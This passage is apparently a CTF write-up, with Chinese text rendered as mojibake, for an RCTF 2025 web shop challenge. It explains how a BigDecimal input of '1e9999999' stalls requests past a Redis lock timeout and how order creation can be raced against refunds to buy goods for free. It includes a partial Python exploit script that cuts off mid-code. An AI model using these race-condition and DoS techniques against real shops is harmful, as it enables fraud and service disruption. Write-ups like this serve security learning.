<span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>purchasedProductIds<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>xiaotudouId<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"little potato needed~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>purchasedProductIds<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>diguaId<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"sweet potato needed~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>purchasedProductIds<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>yuId<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"fish needed~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>purchasedProductIds<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>datudouId<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"large potato needed~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>user<span class="token punctuation">.</span><span class="token function">getBalance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BigDecimal</span><span class="token punctuation">(</span><span class="token string">"10.00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"your balance is lower than 10~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Coupon</span><span class="token punctuation">></span></span> userCoupons <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>couponService<span class="token punctuation">.</span><span class="token function">getUserCoupons</span><span class="token punctuation">(</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">boolean</span> hasUnusedCoupon <span class="token operator">=</span> userCoupons<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">anyMatch</span><span class="token punctuation">(</span><span class="token punctuation">(</span>coupon<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token operator">!</span>coupon<span class="token punctuation">.</span><span class="token function">getIsUsed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>hasUnusedCoupon<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"you cannot use your coupon~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">success</span><span class="token punctuation">(</span><span class="token string">"Ultimate Freeloader! ï¼"</span><span class="token punctuation">,</span> <span class="token string">"RCTF&#123;test_flag&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"internal error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ç”¨æˆ·å·²è®¤è¯ï¼ˆæœ‰æ•ˆçš„JWT tokenï¼‰</li><li>è´­ä¹°å¹¶å®Œæˆï¼ˆçŠ¶æ€ä¸º COMPLETEDï¼‰ä»¥ä¸‹4ä¸ªå•†å“ï¼š<ul><li>Little Potatoï¼ˆå°åœŸè±†ï¼‰- 5.50</li><li>Sweet Potatoï¼ˆåœ°ç“œï¼‰- 8.80</li><li>Fish Fishï¼ˆé±¼ï¼‰- 4.20</li><li>Large Potatoï¼ˆå¤§åœŸè±†ï¼‰- 10.00</li></ul></li><li>ç”¨æˆ·ä½™é¢å¿…é¡»ç­‰äº 10.00ï¼ˆä¸èƒ½ä½äº10ï¼‰</li><li>ç”¨æˆ·å¿…é¡»æœ‰ä¸€ä¸ªæœªä½¿ç”¨çš„ä¼˜æƒ åˆ¸</li></ul><p>ç›®æ ‡æ˜¯é›¶å…ƒè´­ï¼Œæ€è·¯ä¸Šå¾€æ¡ä»¶ç«äº‰é </p><h2 id="è§£æ³•ä¸€ï¼šé«˜ç²¾åº¦è¿ç®—å¯¼è‡´çš„-dos-ç«äº‰-redis-é”é‡Šæ”¾"><a href="#è§£æ³•ä¸€ï¼šé«˜ç²¾åº¦è¿ç®—å¯¼è‡´çš„-dos-ç«äº‰-redis-é”é‡Šæ”¾" class="headerlink" title="è§£æ³•ä¸€ï¼šé«˜ç²¾åº¦è¿ç®—å¯¼è‡´çš„ dos ç«äº‰ redis é”é‡Šæ”¾"></a>è§£æ³•ä¸€ï¼šé«˜ç²¾åº¦è¿ç®—å¯¼è‡´çš„ dos ç«äº‰ redis é”é‡Šæ”¾</h2><p>OrderService::createOrder ä¸­å®ç°äº† redis é”</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> lockKey <span class="token operator">=</span> <span class="token string">"order:user:"</span> <span class="token operator">+</span> userId<span class="token punctuation">;</span><span class="token class-name">String</span> lockValue <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>redisLockUtil<span class="token punctuation">.</span><span class="token function">generateLockValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>redisLockUtil<span class="token punctuation">.</span><span class="token function">tryLock</span><span class="token punctuation">(</span>lockKey<span class="token punctuation">,</span> lockValue<span class="token punctuation">,</span> <span class="token number">3L</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    result<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">,</span> <span class="token string">"System is busy, please try again later"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// ä¸šåŠ¡é€»è¾‘</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>redisLockUtil<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span>lockKey<span class="token punctuation">,</span> lockValue<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œè®¾ç½®äº†é”å¯¼è‡´åŒä¸€ä¸ªç”¨æˆ·åœ¨åŒä¸€æ—¶é—´åªèƒ½å‘èµ·ä¸€ä¸ªåˆ›å»ºè®¢å•çš„è¯·æ±‚ï¼Œä½†æ˜¯è®¾ç½®äº†é”çš„è¶…æ—¶æ—¶é—´ä¸º 3 ç§’ï¼Œè¶…æ—¶ä¹‹åå°±ä¼šè§£é™¤é”ï¼Œä»è€Œå…è®¸ç»•è¿‡å¹¶å‘é™åˆ¶å‘èµ·ç¬¬äºŒä¸ªè¯·æ±‚</p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªèƒ½è®©ä»£ç æ‰§è¡Œ 3 ç§’ä»¥ä¸Šçš„è€—æ—¶æ“ä½œï¼Œè¿™é‡Œéœ€è¦äº†è§£åˆ° <code>BigDecimal</code> ç±»çš„é—®é¢˜</p><blockquote><p>åœ¨äº¤æ˜“ç­‰æ¶‰åŠé«˜ç²¾åº¦æ•°å€¼è¿ç®—çš„åœºæ™¯ä¸‹å¸¸ç”¨åˆ° BigDecimal ç±»ï¼Œä½†æ˜¯ BigDecimal é«˜ç²¾åº¦çš„è¿ç®—çš„ä»£ä»·æ˜¯æé«˜çš„æ€§èƒ½æŸè€—ï¼Œåœ¨ Java ä¸­è‹¥ BigDecimal çš„å…¥å‚å¯æ§ï¼Œåˆ›å»ºçš„å¯¹è±¡è‹¥è¿›è¡ŒåŠ å‡ä¹˜é™¤ç­‰è¿ç®—åˆ™ä¼šæœ‰ Dos çš„é£é™©</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>rois</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>math<span class="token punctuation">.</span></span><span class="token class-name">BigDecimal</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">BigDecimal</span> num <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigDecimal</span><span class="token punctuation">(</span><span class="token string">"1e9999999"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Long</span> startTime <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Long</span><span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BigDecimal</span> num1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigDecimal</span><span class="token punctuation">(</span><span class="token string">"1111"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BigDecimal</span> res <span class="token operator">=</span>  num<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>num1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Long</span> endTime <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Long</span><span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>endTime <span class="token operator">-</span> startTime<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œä¼šäº§ç”Ÿå°†è¿‘ 4 ç§’çš„å»¶è¿Ÿ</p><p>è§‚å¯Ÿä¸šåŠ¡é€»è¾‘ä¸­æˆ‘ä»¬å¯æ§çš„ BigDecimal å€¼ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">BigDecimal</span> quantity <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigDecimal</span><span class="token punctuation">(</span>orderRequest<span class="token punctuation">.</span><span class="token function">getQuantity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/11/15/RCTF-2025/IMG-20260113015526489.png"></p><p>æ­¤å¤„ä½œä¸ºé£é™©ç‚¹ï¼Œåé¢æ˜¯ä½¿ç”¨ä¼˜æƒ åŠµçš„é€»è¾‘ï¼Œè€Œå‰é¢æ˜¯åˆ¤æ–­ä¼˜æƒ åŠµæ˜¯å¦å¯ç”¨çš„é€»è¾‘</p><p>å¦‚æœæˆ‘ä»¬çš„è®¢å•Aä¼ å…¥äº† quantity&#x3D;1e9999999 ä»¤ä»£ç å¡åœ¨è¿™ä¸€è¡Œï¼Œç­‰å¾… 3 ç§’å redis é”é‡Šæ”¾ï¼Œæ­¤æ—¶ dos è¿˜æœªç»“æŸï¼Œç”±äºæ­¤æ—¶è¿˜æ²¡æœ‰èµ°åˆ°æ›´æ–°ä¼˜æƒ åˆ¸çš„é€»è¾‘ä¼˜æƒ åˆ¸ä»ç„¶å¯ç”¨ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ›å»ºå¦ä¸€ä¸ªä½¿ç”¨ä¼˜æƒ åˆ¸çš„è®¢å• Bï¼Œç­‰å¾… dos ç»“æŸå update ä¼˜æƒ åˆ¸çš„çŠ¶æ€ä¸º falseï¼Œæ­¤æ—¶æˆ‘ä»¬å·²ç»æˆåŠŸåˆ›å»ºäº†ä¸¤ä¸ªä½¿ç”¨ä¼˜æƒ åˆ¸çš„è®¢å•ï¼Œé€€æ¬¾å…¶ä¸­ä»»æ„ä¸€ä¸ªè®¢å•å³å¯å°†ä½™é¢æ¢å¤å¦‚åˆå¹¶ä¸”æ¢å¤ä¼˜æƒ åˆ¸ä¸ºæœªä½¿ç”¨ï¼Œä»¥æ­¤æ¥å®ç°é›¶å…ƒè´­</p><p>ä¸å¥½ï¼Œæœ¬åœ°çš„æ€§èƒ½å¤ªå¥½äº†ï¼Œè¶…æ—¶åªæœ‰ 1 ç§’å¤šï¼ˆ</p><hr><h2 id="è§£æ³•äºŒï¼šåˆ›å»ºè®¢å•ä¸æ’¤é”€è®¢å•ä¹‹é—´ç«äº‰"><a href="#è§£æ³•äºŒï¼šåˆ›å»ºè®¢å•ä¸æ’¤é”€è®¢å•ä¹‹é—´ç«äº‰" class="headerlink" title="è§£æ³•äºŒï¼šåˆ›å»ºè®¢å•ä¸æ’¤é”€è®¢å•ä¹‹é—´ç«äº‰"></a>è§£æ³•äºŒï¼šåˆ›å»ºè®¢å•ä¸æ’¤é”€è®¢å•ä¹‹é—´ç«äº‰</h2><p>å¯¹äºåˆ›å»ºè®¢å•çš„é”ï¼Œé”®ä¸º<code>&quot;order:user:&quot; + userId</code>ï¼Œå¯¹äºå–æ¶ˆè®¢å•çš„é”ï¼Œé”®ä¸º<code>&quot;refund:order:&quot; + orderId</code>ï¼Œé‚£ä¹ˆå³ä½¿åœ¨åˆ›å»º&#x2F;æ’¤é”€è®¢å•æ—¶æ— æ³•ç«äº‰ï¼Œä½†æ˜¯å´å­˜åœ¨åˆ›å»ºè®¢å•å’Œæ’¤é”€è®¢å•ä¹‹é—´çš„ç«äº‰</p><p><img src="/blog/2025/11/15/RCTF-2025/IMG-20260113021809344.png"></p><p><img src="/blog/2025/11/15/RCTF-2025/IMG-20260113021841223.png"></p><p>åˆ›å»ºè®¢å•ä¸é€€æ¬¾é”ä¸åŒï¼Œä½†æ˜¯åŒæ—¶å‘èµ·ç«äº‰æ—¶åˆæ€ userBalence æ˜¯ä¸€æ ·çš„ï¼Œå› æ­¤å­˜åœ¨ä»¥ä¸‹ç«äº‰å¯èƒ½ï¼š</p><p>å¦‚æœç”¨æˆ·å·²ç»ä½¿ç”¨ä¼˜æƒ åˆ¸ä¸‹å•å•†å“ï¼Œä½™é¢ä¸º10ï¼Œä½¿ç”¨ä¼˜æƒ åˆ¸</p><p>å»ºç«‹ä»¥ä¸‹ä¸¤ä¸ªçº¿ç¨‹ T1 å’Œ T2</p><table><thead><tr><th>åˆ›å»ºè®¢å•T1(ä¸ä½¿ç”¨ä¼˜æƒ åˆ¸)</th><th>æ’¤é”€è®¢å•T2</th></tr></thead><tbody><tr><td>è·å–ç”¨æˆ·ä½™é¢10ï¼ˆä¼˜æƒ åˆ¸ä¸å¯ç”¨ï¼‰</td><td></td></tr><tr><td></td><td>è·å–ç”¨æˆ·ä½™é¢10ï¼ˆä¼˜æƒ åˆ¸ä¸å¯ç”¨ï¼‰</td></tr><tr><td>ç”¨æˆ·ä½™é¢updateä¸ºæ‰£é™¤finalPriceåä½™é¢ï¼ˆä¼˜æƒ åˆ¸ä¸å¯ç”¨ï¼Œæœ€ç»ˆä½™é¢å°äº10ï¼‰</td><td></td></tr><tr><td></td><td>ç”¨æˆ·ä½™é¢updateä¸ºæ¢å¤finalPriceåä½™é¢ï¼ˆä¼˜æƒ åˆ¸å¯ç”¨ï¼Œä½™é¢æ¢å¤åˆ°10ï¼‰</td></tr></tbody></table><p>ä»è€Œå®ç°ä¸èŠ±é’±ä¸ä½¿ç”¨ä¼˜æƒ åˆ¸ä½†æ˜¯èƒ½å¤Ÿè´­å…¥å•†å“ï¼Œç›¸åŒçš„æ€è·¯åˆ†åˆ«å¯¹4ç§å•†å“è¿›è¡Œç«äº‰</p><p>è¿™é‡Œç›´æ¥æ”¾ SU çš„ exp äº†ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">import</span> string<span class="token keyword">import</span> threading<span class="token keyword">import</span> time<span class="token keyword">from</span> decimal <span class="token keyword">import</span> Decimal<span class="token keyword">import</span> requestsBASE_URL <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:28086"</span><span class="token comment"># BASE_URL = "http://61.147.171.35:51469"</span>TARGET_PRODUCTS <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"Little Potato"</span><span class="token punctuation">,</span> <span class="token string">"Sweet Potato"</span><span class="token punctuation">,</span> <span class="token string">"Fish Fish"</span><span class="token punctuation">,</span> <span class="token string">"Large Potato"</span><span class="token punctuation">]</span>BASE_PRODUCT_NAME <span class="token operator">=</span> <span class="token string">"Little Potato"</span>SESSION <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">api_request</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> path<span class="token punctuation">,</span> token<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> BASE_URL <span class="token operator">+</span> path    headers <span class="token operator">=</span> kwargs<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">"headers"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> token<span class="token punctuation">:</span>        headers<span class="token punctuation">[</span><span class="token string">"Authorization"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"Bearer </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">if</span> <span class="token string">"json"</span> <span class="token keyword">in</span> kwargs <span class="token keyword">and</span> <span class="token string">"Content-Type"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> headers<span class="token punctuation">:</span>        headers<span class="token punctuation">[</span><span class="token string">"Content-Type"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"application/json"</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            resp <span class="token operator">=</span> SESSION<span class="token punctuation">.</span>request<span class="token punctuation">(</span>method<span class="token punctuation">,</span> url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span> resp<span class="token punctuation">.</span>status_code<span class="token punctuation">,</span> <span class="token string">"raw"</span><span class="token punctuation">:</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">&#125;</span>        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"request failed"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">random_username</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"ctf"</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> random_username<span class="token punctuation">(</span><span class="token punctuation">)</span>        email <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">@example.com"</span></span>        body <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"Pass1234"</span><span class="token punctuation">,</span> <span class="token string">"email"</span><span class="token punctuation">:</span> email<span class="token punctuation">&#125;</span>        data <span class="token operator">=</span> api_request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string">"/api/user/register"</span><span class="token punctuation">,</span> json<span class="token operator">=</span>body<span class="token punctuation">)</span>        <span class="token keyword">if</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">200</span> <span class="token keyword">and</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            d <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span>            user <span class="token operator">=</span> d<span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Registered user </span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">return</span> user<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> d<span class="token punctuation">[</span><span class="token string">"token"</span><span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] register failed:"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_products</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> api_request<span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"/api/product/list"</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>    <span class="token keyword">assert</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">,</span> data    products <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>p<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">:</span> p<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span> <span class="token keyword">for</span> p <span class="token keyword">in</span> products<span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">get_coupon_info</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> api_request<span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"/api/coupon/my"</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>    <span class="token keyword">assert</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">,</span> data    coupons <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span>    <span class="token keyword">assert</span> coupons    <span class="token keyword">return</span> coupons<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">get_user_balance</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> api_request<span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"/api/user/info"</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>    <span class="token keyword">assert</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">,</span> data    <span class="token keyword">return</span> Decimal<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_orders</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> api_request<span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"/api/order/my"</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>    <span class="token keyword">assert</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">,</span> data    <span class="token keyword">return</span> data<span class="token punctuation">[</span><span 